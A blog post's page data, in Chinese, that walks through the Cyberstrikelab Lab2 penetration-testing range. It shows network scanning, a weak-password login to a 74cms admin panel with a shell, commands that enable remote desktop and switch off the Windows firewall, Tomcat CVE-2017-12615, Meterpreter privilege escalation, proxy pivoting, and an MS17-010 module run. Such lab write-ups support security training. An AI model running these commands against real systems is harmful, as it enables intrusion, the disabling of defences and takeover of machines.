{"pageProps":{"postData":{"id":"CyberstrikelabLab2","contentHtml":"<h1>Lab2</h1>\n<blockquote>\n<p><a href=\"https://www.cyberstrikelab.com/#/scene/detail/21\">https://www.cyberstrikelab.com/#/scene/detail/21</a></p>\n</blockquote>\n<h2>192.168.10.10</h2>\n<h3>Recon</h3>\n<p>端口扫描</p>\n<pre><code class=\"hljs language-php\">➜  Lab2 nmap -sT -min-rate <span class=\"hljs-number\">5000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">10.10</span>                                  \nStarting Nmap <span class=\"hljs-number\">7.95</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2025-08-12 18:36 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">10.10</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.053</span>s latency).\nNot shown: <span class=\"hljs-number\">65521</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused)\nPORT      STATE SERVICE\n<span class=\"hljs-number\">135</span>/tcp   open  msrpc\n<span class=\"hljs-number\">139</span>/tcp   open  netbios-ssn\n<span class=\"hljs-number\">445</span>/tcp   open  microsoft-ds\n<span class=\"hljs-number\">808</span>/tcp   open  ccproxy-http\n<span class=\"hljs-number\">3306</span>/tcp  open  mysql\n<span class=\"hljs-number\">5040</span>/tcp  open  unknown\n<span class=\"hljs-number\">7680</span>/tcp  open  pando-pub\n<span class=\"hljs-number\">49664</span>/tcp open  unknown\n<span class=\"hljs-number\">49665</span>/tcp open  unknown\n<span class=\"hljs-number\">49666</span>/tcp open  unknown\n<span class=\"hljs-number\">49667</span>/tcp open  unknown\n<span class=\"hljs-number\">49668</span>/tcp open  unknown\n<span class=\"hljs-number\">49669</span>/tcp open  unknown\n<span class=\"hljs-number\">49670</span>/tcp open  unknown\n\nNmap done: <span class=\"hljs-number\">1</span> IP <span class=\"hljs-title function_ invoke__\">address</span> (<span class=\"hljs-number\">1</span> host up) scanned in <span class=\"hljs-number\">14.64</span> seconds\n</code></pre>\n<p><code>808</code> 是 <code>web</code> 服务</p>\n<pre><code class=\"hljs language-php\">➜  Lab2 nmap -sT -A -p $(cat port | awk -F <span class=\"hljs-string\">'/'</span> <span class=\"hljs-string\">'{print $1}'</span> | paste -sd <span class=\"hljs-string\">','</span>) <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">10.10</span>\nStarting Nmap <span class=\"hljs-number\">7.95</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2025-08-12 18:37 CST</span>\nStats: <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">02</span>:<span class=\"hljs-number\">08</span> elapsed; <span class=\"hljs-number\">0</span> hosts <span class=\"hljs-title function_ invoke__\">completed</span> (<span class=\"hljs-number\">1</span> up), <span class=\"hljs-number\">1</span> undergoing Service Scan\nService scan Timing: About <span class=\"hljs-number\">92.86</span>% done; ETC: <span class=\"hljs-number\">18</span>:<span class=\"hljs-number\">40</span> (<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">10</span> remaining)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">10.10</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.054</span>s latency).\n\nPORT      STATE SERVICE       VERSION\n<span class=\"hljs-number\">135</span>/tcp   open  msrpc         Microsoft Windows RPC\n<span class=\"hljs-number\">139</span>/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n<span class=\"hljs-number\">445</span>/tcp   open  microsoft-ds?\n<span class=\"hljs-number\">808</span>/tcp   open  http          Apache httpd <span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">39</span> ((Win64) OpenSSL/<span class=\"hljs-number\">1.1</span>.<span class=\"hljs-number\">1</span>b mod_fcgid/<span class=\"hljs-number\">2.3</span>.<span class=\"hljs-number\">9</span>a mod_log_rotate/<span class=\"hljs-number\">1.02</span>)\n|_http-title: \\xE9\\xAA\\x91\\xE5\\xA3\\xABPHP\\xE9\\xAB\\x98\\xE7\\xAB\\xAF\\xE4\\xBA\\xBA\\xE6\\x89\\x8D\\xE7\\xB3\\xBB\\xE7\\xBB\\<span class=\"hljs-title function_ invoke__\">x9F</span>(www.<span class=\"hljs-number\">74</span>cms.com)\n| http-cookie-flags:\n|   /:\n|     PHPSESSID:\n|_      httponly flag not set\n|_http-server-header: Apache/<span class=\"hljs-number\">2.4</span>.<span class=\"hljs-number\">39</span> (Win64) OpenSSL/<span class=\"hljs-number\">1.1</span>.<span class=\"hljs-number\">1</span>b mod_fcgid/<span class=\"hljs-number\">2.3</span>.<span class=\"hljs-number\">9</span>a mod_log_rotate/<span class=\"hljs-number\">1.02</span>\n<span class=\"hljs-number\">3306</span>/tcp  open  mysql         <span class=\"hljs-title function_ invoke__\">MySQL</span> (unauthorized)\n<span class=\"hljs-number\">5040</span>/tcp  open  unknown\n<span class=\"hljs-number\">7680</span>/tcp  open  pando-pub?\n<span class=\"hljs-number\">49664</span>/tcp open  msrpc         Microsoft Windows RPC\n<span class=\"hljs-number\">49665</span>/tcp open  msrpc         Microsoft Windows RPC\n<span class=\"hljs-number\">49666</span>/tcp open  msrpc         Microsoft Windows RPC\n<span class=\"hljs-number\">49667</span>/tcp open  msrpc         Microsoft Windows RPC\n<span class=\"hljs-number\">49668</span>/tcp open  msrpc         Microsoft Windows RPC\n<span class=\"hljs-number\">49669</span>/tcp open  msrpc         Microsoft Windows RPC\n<span class=\"hljs-number\">49670</span>/tcp open  msrpc         Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nAggressive OS guesses: Microsoft Windows <span class=\"hljs-number\">10</span> <span class=\"hljs-number\">1709</span> - <span class=\"hljs-number\">21</span>H2 (<span class=\"hljs-number\">97</span>%), Microsoft Windows <span class=\"hljs-number\">10</span> (<span class=\"hljs-number\">93</span>%), Microsoft Windows <span class=\"hljs-title function_ invoke__\">Longhorn</span> (<span class=\"hljs-number\">93</span>%), Microsoft Windows <span class=\"hljs-number\">10</span> <span class=\"hljs-number\">21</span>H1 (<span class=\"hljs-number\">92</span>%), Microsoft Windows <span class=\"hljs-number\">10</span> <span class=\"hljs-number\">1903</span> (<span class=\"hljs-number\">92</span>%), Microsoft Windows <span class=\"hljs-number\">10</span> <span class=\"hljs-number\">21</span>H2 (<span class=\"hljs-number\">92</span>%), Microsoft Windows <span class=\"hljs-number\">10</span> <span class=\"hljs-number\">1703</span> <span class=\"hljs-keyword\">or</span> Windows <span class=\"hljs-number\">11</span> <span class=\"hljs-number\">21</span>H2 (<span class=\"hljs-number\">91</span>%), Microsoft Windows <span class=\"hljs-number\">10</span> <span class=\"hljs-number\">1803</span> (<span class=\"hljs-number\">91</span>%), Microsoft Windows <span class=\"hljs-number\">8</span> (<span class=\"hljs-number\">91</span>%), Microsoft Windows <span class=\"hljs-number\">10</span> Education Edition <span class=\"hljs-number\">1909</span> (<span class=\"hljs-number\">90</span>%)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> <span class=\"hljs-title function_ invoke__\">host</span> (test conditions non-ideal).\nNetwork Distance: <span class=\"hljs-number\">2</span> hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode:\n|   <span class=\"hljs-number\">3</span>:<span class=\"hljs-number\">1</span>:<span class=\"hljs-number\">1</span>:\n|_    Message signing enabled but not required\n| smb2-time:\n|   date: <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">08</span>-<span class=\"hljs-number\">12</span>T02:<span class=\"hljs-number\">40</span>:<span class=\"hljs-number\">41</span>\n|_  start_date: N/A\n|_clock-skew: -<span class=\"hljs-number\">8</span>h00m00s\n\n<span class=\"hljs-title function_ invoke__\">TRACEROUTE</span> (using proto <span class=\"hljs-number\">1</span>/icmp)\nHOP RTT      ADDRESS\n<span class=\"hljs-number\">1</span>   <span class=\"hljs-number\">53.19</span> ms <span class=\"hljs-number\">172.16</span>.<span class=\"hljs-number\">233.1</span>\n<span class=\"hljs-number\">2</span>   <span class=\"hljs-number\">53.32</span> ms <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">10.10</span>\n\nOS <span class=\"hljs-keyword\">and</span> Service detection performed. Please report any incorrect results at https:<span class=\"hljs-comment\">//nmap.org/submit/ .</span>\nNmap done: <span class=\"hljs-number\">1</span> IP <span class=\"hljs-title function_ invoke__\">address</span> (<span class=\"hljs-number\">1</span> host up) scanned in <span class=\"hljs-number\">181.60</span> seconds\n</code></pre>\n<h3>骑士 CMS</h3>\n<p>访问 <code>808</code> 端口</p>\n<p><img src=\"/post-images/CyberstrikelabLab2/image.png\" alt=\"image.png\"></p>\n<p>在页尾中能找到 <code>Powered by 74cms v4.2.111</code></p>\n<p>通过搜寻，存在后台 <code>getshell</code></p>\n<p>先测试是否存在弱密码，后台页面：<code>http://192.168.10.10:808/index.php?m=admin&#x26;c=index&#x26;a=login</code></p>\n<p>通过弱密码 <code>admin</code>:<code>admin123456</code> 进入后台</p>\n<p><img src=\"/post-images/CyberstrikelabLab2/image1.png\" alt=\"image.png\"></p>\n<blockquote>\n<p>利用链接：<a href=\"https://blog.csdn.net/m0_63253040/article/details/127041028\">https://blog.csdn.net/m0_63253040/article/details/127041028</a></p>\n</blockquote>\n<p><img src=\"/post-images/CyberstrikelabLab2/image2.png\" alt=\"image.png\"></p>\n<p>然后访问 <code>/Application/Home/Conf/config.php</code></p>\n<p><img src=\"/post-images/CyberstrikelabLab2/image3.png\" alt=\"image.png\"></p>\n<p>反弹 <code>shell</code></p>\n<p><img src=\"/post-images/CyberstrikelabLab2/image4.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/CyberstrikelabLab2/image5.png\" alt=\"image.png\"></p>\n<p>上线 <code>Vshell</code></p>\n<p>首先将防火墙和远程桌面打开</p>\n<pre><code class=\"hljs language-php\">PS C:\\phpstudy_pro\\WWW\\Application\\Home\\Conf> REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal<span class=\"hljs-string\">\" \"</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class=\"hljs-number\">00000000</span> /f\nThe operation completed successfully.\n\nPS C:\\phpstudy_pro\\WWW\\Application\\Home\\Conf> netsh advfirewall set allprofiles state off\nOk.\n</code></pre>\n<p>通过一键上线命令上线，传<code>payload</code> 也可以</p>\n<p><img src=\"/post-images/CyberstrikelabLab2/image6.png\" alt=\"image.png\"></p>\n<h3>信息收集</h3>\n<p>读取第一个 <code>flag.txt</code></p>\n<pre><code class=\"hljs language-php\">C:\\>type flag.txt\ngo-flag{MP9E4xXhya0TlzVF}\n</code></pre>\n<p><code>IP</code> 信息，很奇怪，为什么只有一个网络</p>\n<pre><code class=\"hljs language-php\">C:\\>ipconfig\n\nWindows IP 配置\n\n以太网适配器 以太网实例 <span class=\"hljs-number\">0</span>:\n\n   连接特定的 DNS 后缀 . . . . . . . :\n   本地链接 IPv6 地址. . . . . . . . : fe80::<span class=\"hljs-number\">81</span>d8:<span class=\"hljs-number\">7722</span>:<span class=\"hljs-number\">88</span>a0:<span class=\"hljs-number\">5578</span>%<span class=\"hljs-number\">12</span>\n   IPv4 地址 . . . . . . . . . . . . : <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">10.10</span>\n   子网掩码  . . . . . . . . . . . . : <span class=\"hljs-number\">255.255</span>.<span class=\"hljs-number\">255.0</span>\n   默认网关. . . . . . . . . . . . . : <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">10.233</span>\n</code></pre>\n<p>我么对网段段进行扫描，存在三台机子</p>\n<pre><code class=\"hljs language-php\">➜  Lab2 nmap -sn <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">10.0</span>/<span class=\"hljs-number\">24</span>                                                          \nStarting Nmap <span class=\"hljs-number\">7.95</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2025-08-12 19:01 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">10.10</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.056</span>s latency).\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">10.20</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.058</span>s latency).\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">10.233</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.061</span>s latency).\nNmap done: <span class=\"hljs-number\">256</span> IP <span class=\"hljs-title function_ invoke__\">addresses</span> (<span class=\"hljs-number\">3</span> hosts up) scanned in <span class=\"hljs-number\">7.37</span> seconds\n</code></pre>\n<p><code>Fscan</code> 扫描一下</p>\n<pre><code class=\"hljs language-php\">➜  fscan ./fscan_1.<span class=\"hljs-number\">8.4</span> -h <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">10.1</span>-<span class=\"hljs-number\">255</span>\n\n   ___                              _    \n  / _ \\     ___  ___ _ __ __ _  ___| | __ \n / /_\\/____/ __|/ __| <span class=\"hljs-string\">'__/ _` |/ __| |/ /\n/ /_\\\\_____\\__ \\ (__| | | (_| | (__|   &#x3C;    \n\\____/     |___/\\___|_|  \\__,_|\\___|_|\\_\\   \n                     fscan version: 1.8.4\nstart infoscan\n(icmp) Target 192.168.10.10   is alive\n(icmp) Target 192.168.10.20   is alive\n(icmp) Target 192.168.10.233  is alive\n[*] Icmp alive hosts len is: 3\n192.168.10.10:139 open\n192.168.10.20:135 open\n192.168.10.10:3306 open\n192.168.10.10:135 open\n192.168.10.233:22 open\n192.168.10.20:445 open\n192.168.10.20:139 open\n192.168.10.10:445 open\n192.168.10.20:8080 open\n192.168.10.10:7680 open\n192.168.10.233:8080 open\n192.168.10.10:808 open\n192.168.10.20:8009 open\n[*] alive ports len is: 13\nstart vulscan\n[*] NetInfo \n[*]192.168.10.10\n   [->]DESKTOP-JFB57A8\n   [->]192.168.10.10\n[*] WebTitle https://192.168.10.233:8080 code:404 len:19     title:None\n[*] NetBios 192.168.10.20   cyberweb.cyberstrikelab.com         Windows Server 2012 R2 Standard 9600\n[*] WebTitle http://192.168.10.20:8080 code:200 len:11432  title:Apache Tomcat/8.5.19\n[*] WebTitle http://192.168.10.10:808  code:404 len:1331   title:系统发生错误\n[+] PocScan http://192.168.10.20:8080 poc-yaml-iis-put-getshell \n[+] PocScan http://192.168.10.20:8080 poc-yaml-tomcat-cve-2017-12615-rce \n</span></code></pre>\n<p><code>192.168.10.20</code> 扫描出来两个洞</p>\n<h2>192.168.10.20</h2>\n<h3>cve-2017-12615</h3>\n<p>访问 <code>8080</code> 端口</p>\n<p><img src=\"/post-images/CyberstrikelabLab2/image7.png\" alt=\"image.png\"></p>\n<p>之前在 <code>Fscan</code> 扫描出来 <code>cve-2017-12615</code></p>\n<blockquote>\n<p><a href=\"https://www.cnblogs.com/confidant/p/15440233.html\">https://www.cnblogs.com/confidant/p/15440233.html</a></p>\n</blockquote>\n<p><img src=\"/post-images/CyberstrikelabLab2/image8.png\" alt=\"image.png\"></p>\n<p>连上冰蝎</p>\n<p><img src=\"/post-images/CyberstrikelabLab2/image9.png\" alt=\"image.png\"></p>\n<h3>提权</h3>\n<p>查看权限</p>\n<pre><code class=\"hljs language-php\">C:/Program Files/Apache Software Foundation/Tomcat <span class=\"hljs-number\">8.5</span>/ >whoami /all\n\n用户信息\n----------------\n\n用户名                       SID     \n============================ ========\nnt authority\\network service S-<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">5</span>-<span class=\"hljs-number\">20</span>\n\n组信息\n-----------------\n\n组名                                   类型   SID          属性                          \n====================================== ====== ============ ==============================\nMandatory Label\\System Mandatory Level 标签   S-<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">16</span>-<span class=\"hljs-number\">16384</span>                               \nEveryone                               已知组 S-<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">0</span>      必需的组, 启用于默认, 启用的组\nBUILTIN\\Users                          别名   S-<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">5</span>-<span class=\"hljs-number\">32</span>-<span class=\"hljs-number\">545</span> 必需的组, 启用于默认, 启用的组\nNT AUTHORITY\\SERVICE                   已知组 S-<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">5</span>-<span class=\"hljs-number\">6</span>      必需的组, 启用于默认, 启用的组\nCONSOLE LOGON                          已知组 S-<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">2</span>-<span class=\"hljs-number\">1</span>      必需的组, 启用于默认, 启用的组\nNT AUTHORITY\\Authenticated Users       已知组 S-<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">5</span>-<span class=\"hljs-number\">11</span>     必需的组, 启用于默认, 启用的组\nNT AUTHORITY\\This Organization         已知组 S-<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">5</span>-<span class=\"hljs-number\">15</span>     必需的组, 启用于默认, 启用的组\nLOCAL                                  已知组 S-<span class=\"hljs-number\">1</span>-<span class=\"hljs-number\">2</span>-<span class=\"hljs-number\">0</span>      必需的组, 启用于默认, 启用的组\n\n特权信息\n----------------------\n\n特权名                        描述                 状态  \n============================= ==================== ======\nSeAssignPrimaryTokenPrivilege 替换一个进程级令牌   已禁用\nSeIncreaseQuotaPrivilege      为进程调整内存配额   已禁用\nSeAuditPrivilege              生成安全审核         已禁用\nSeChangeNotifyPrivilege       绕过遍历检查         已启用\nSeImpersonatePrivilege        身份验证后模拟客户端 已启用\nSeCreateGlobalPrivilege       创建全局对象         已启用\nSeIncreaseWorkingSetPrivilege 增加进程工作集       已禁用\n</code></pre>\n<p>可以打 <code>SweetPotato</code> ，但是不知道为什么打不上，这里上线 <code>MSF</code> 来打</p>\n<pre><code class=\"hljs language-php\">msf6 <span class=\"hljs-title function_ invoke__\">exploit</span>(multi/handler) > run\n[*] Started reverse TCP handler on <span class=\"hljs-number\">172.16</span>.<span class=\"hljs-number\">233.2</span>:<span class=\"hljs-number\">4444</span> \n[*] Sending <span class=\"hljs-title function_ invoke__\">stage</span> (<span class=\"hljs-number\">203846</span> bytes) to <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">10.20</span>\n[*] Meterpreter session <span class=\"hljs-number\">1</span> <span class=\"hljs-title function_ invoke__\">opened</span> (<span class=\"hljs-number\">172.16</span>.<span class=\"hljs-number\">233.2</span>:<span class=\"hljs-number\">4444</span> -> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">10.20</span>:<span class=\"hljs-number\">49220</span>) at <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">08</span>-<span class=\"hljs-number\">12</span> <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">22</span>:<span class=\"hljs-number\">41</span> +<span class=\"hljs-number\">0800</span>\n\nmeterpreter > getsystem\n...got system via technique <span class=\"hljs-number\">4</span> (Named Pipe <span class=\"hljs-title function_ invoke__\">Impersonation</span> (RPCSS variant)).\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n</code></pre>\n<p>成功获得 <code>system</code> 权限</p>\n<p>读第二个 <code>flag</code></p>\n<pre><code class=\"hljs language-php\">C:\\>type flag.txt\ngo-flag{<span class=\"hljs-number\">2</span>a1AygwfTuccnNJY}\n</code></pre>\n<h3>信息收集</h3>\n<p>还有二层内网</p>\n<p><img src=\"/post-images/CyberstrikelabLab2/image10.png\" alt=\"image.png\"></p>\n<p>上线 <code>Vshell</code> ，直接弹即可</p>\n<p><img src=\"/post-images/CyberstrikelabLab2/image11.png\" alt=\"image.png\"></p>\n<p><code>Fscan</code> 扫描发现 <code>192.168.20.30</code> 存在永恒之蓝，要走代理打</p>\n<p><img src=\"/post-images/CyberstrikelabLab2/image12.png\" alt=\"image.png\"></p>\n<p>可以直接在 <code>Vshell</code> 上进行代理</p>\n<p>选择 <code>192.168.10.20</code> 然后点击隧道代理</p>\n<p><img src=\"/post-images/CyberstrikelabLab2/image13.png\" alt=\"image.png\"></p>\n<p><code>Kali</code> 连接即可</p>\n<pre><code class=\"hljs language-php\">➜  Lab2 tail -n <span class=\"hljs-number\">1</span> /etc/proxychains4.conf\nsocks5  <span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span>       <span class=\"hljs-number\">2131</span>    admin   admin\n➜  Lab2 proxychains curl <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">20.30</span>:<span class=\"hljs-number\">8080</span>\n[proxychains] config file found: /etc/proxychains4.conf\n[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.<span class=\"hljs-number\">4</span>\n[proxychains] DLL init: proxychains-ng <span class=\"hljs-number\">4.17</span>\n[proxychains] Strict chain  ...  <span class=\"hljs-number\">127.0</span>.<span class=\"hljs-number\">0.1</span>:<span class=\"hljs-number\">2131</span>  ...  <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">20.30</span>:<span class=\"hljs-number\">8080</span>  ...  OK\ncurl: (<span class=\"hljs-number\">52</span>) Empty reply <span class=\"hljs-keyword\">from</span> server\n</code></pre>\n<h2>192.168.20.30</h2>\n<h3>永恒之蓝</h3>\n<p>通过代理启动 <code>MSF</code></p>\n<pre><code class=\"hljs language-php\">➜  Lab2 proxychains -q msfconsole                                                                                                                                      \nMetasploit tip: The <span class=\"hljs-keyword\">use</span> <span class=\"hljs-title\">command</span> <span class=\"hljs-title\">supports</span> <span class=\"hljs-title\">fuzzy</span> <span class=\"hljs-title\">searching</span> <span class=\"hljs-title\">to</span> <span class=\"hljs-title\">try</span> <span class=\"hljs-title\">and</span> \n<span class=\"hljs-title\">select</span> <span class=\"hljs-title\">the</span> <span class=\"hljs-title\">intended</span> <span class=\"hljs-title\">module</span>, <span class=\"hljs-title\">e</span>.<span class=\"hljs-title\">g</span>. <span class=\"hljs-title\">use</span> <span class=\"hljs-title\">kerberos</span>/<span class=\"hljs-title\">get_ticket</span> <span class=\"hljs-title\">or</span> <span class=\"hljs-title\">use</span> \n<span class=\"hljs-title\">kerberos</span> <span class=\"hljs-title\">forge</span> <span class=\"hljs-title\">silver</span> <span class=\"hljs-title\">ticket</span>\n                                                  \n<span class=\"hljs-title\">IIIIII</span>    <span class=\"hljs-title\">dTb</span>.<span class=\"hljs-title\">dTb</span>        <span class=\"hljs-title\">_</span>.---.<span class=\"hljs-title\">_</span>\n  <span class=\"hljs-title\">II</span>     4'  <span class=\"hljs-title\">v</span>  '<span class=\"hljs-title\">B</span>   .'\"\".'/|\\`.\"\"'.\n  <span class=\"hljs-title\">II</span>     6.     .<span class=\"hljs-title\">P</span>  :  .' / | \\ `.  :\n  <span class=\"hljs-title\">II</span>     '<span class=\"hljs-title\">T</span>;. .;P<span class=\"hljs-string\">'  '</span>.<span class=\"hljs-string\">'  /  |  \\  `.'</span>\n  II      <span class=\"hljs-string\">'T; ;P'</span>    `. /   |   \\ .<span class=\"hljs-string\">'\nIIIIII     '</span>YvP<span class=\"hljs-string\">'       `-.__|__.-'</span>\n\nI love shells --egypt\n\n       =[ metasploit v6.<span class=\"hljs-number\">4.69</span>-dev                          ]\n+ -- --=[ <span class=\"hljs-number\">2529</span> exploits - <span class=\"hljs-number\">1302</span> auxiliary - <span class=\"hljs-number\">432</span> post       ]\n+ -- --=[ <span class=\"hljs-number\">1672</span> payloads - <span class=\"hljs-number\">49</span> encoders - <span class=\"hljs-number\">13</span> nops           ]\n+ -- --=[ <span class=\"hljs-number\">9</span> evasion                                       ]\n\nMetasploit Documentation: https:<span class=\"hljs-comment\">//docs.metasploit.com/</span>\n\nmsf6 > \n</code></pre>\n<p>打 <code>command</code> 就好了，直接读 <code>flag</code></p>\n<pre><code class=\"hljs language-php\">msf6 > search ms17\nmsf6 > <span class=\"hljs-keyword\">use</span> 19\n<span class=\"hljs-title\">msf6</span> <span class=\"hljs-title\">auxiliary</span>(<span class=\"hljs-title\">admin</span>/<span class=\"hljs-title\">smb</span>/<span class=\"hljs-title\">ms17_010_command</span>) > <span class=\"hljs-title\">set</span> <span class=\"hljs-title\">command</span> \"<span class=\"hljs-title\">type</span> <span class=\"hljs-title\">C</span>:\\<span class=\"hljs-title\">flag</span>.<span class=\"hljs-title\">txt</span>\"\n<span class=\"hljs-title\">command</span> => <span class=\"hljs-title\">type</span> <span class=\"hljs-title\">C</span>:\\<span class=\"hljs-title\">flag</span>.<span class=\"hljs-title\">txt</span>\n<span class=\"hljs-title\">msf6</span> <span class=\"hljs-title\">auxiliary</span>(<span class=\"hljs-title\">admin</span>/<span class=\"hljs-title\">smb</span>/<span class=\"hljs-title\">ms17_010_command</span>) > <span class=\"hljs-title\">set</span> <span class=\"hljs-title\">rhost</span> 192.168.20.30\n<span class=\"hljs-title\">rhost</span> => 192.168.20.30\n</code></pre>\n<p><img src=\"/post-images/CyberstrikelabLab2/image14.png\" alt=\"image.png\"></p>","title":"Cyberstrikelab - Lab2","date":"2025-08-12","updated":"2025-08-12","tags":["Cyberstrikelab","Windows","Tomcat","Vshell","多层内网","MS17_010"],"categories":"靶机","comments":true,"description":"Lab2 https://www.cyberstrikelab.com/#/scene/detail/21 192.168.10.10 Recon 端口扫描 808 是 web 服务 骑士 CMS 访问 808 端口 在页尾中能找到 Powered by 74cms v4.2.111 通过搜寻，存在..."},"recentPosts":[{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Machine - TombWatcher","date":"2025-06-08","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason8 - Certificate","title":"HackTheBox - Machine - Certificate","date":"2025-06-02","isEncrypted":false,"year":"2025","month":"10","day":"13"},{"id":"HackTheBoxSeason9 - Imagery","title":"HackTheBox - Season9 - Imagery","date":"2025-10-04","isEncrypted":true,"year":"2025","month":"10","day":"04"},{"id":"TheHackersLabsTortuga","title":"TheHackersLabs - Tortuga","date":"2025-10-01","isEncrypted":false,"year":"2025","month":"10","day":"01"},{"id":"TheHackersLabsElevator","title":"TheHackersLabs - Elevator","date":"2025-09-29","isEncrypted":false,"year":"2025","month":"09","day":"29"}]},"__N_SSG":true}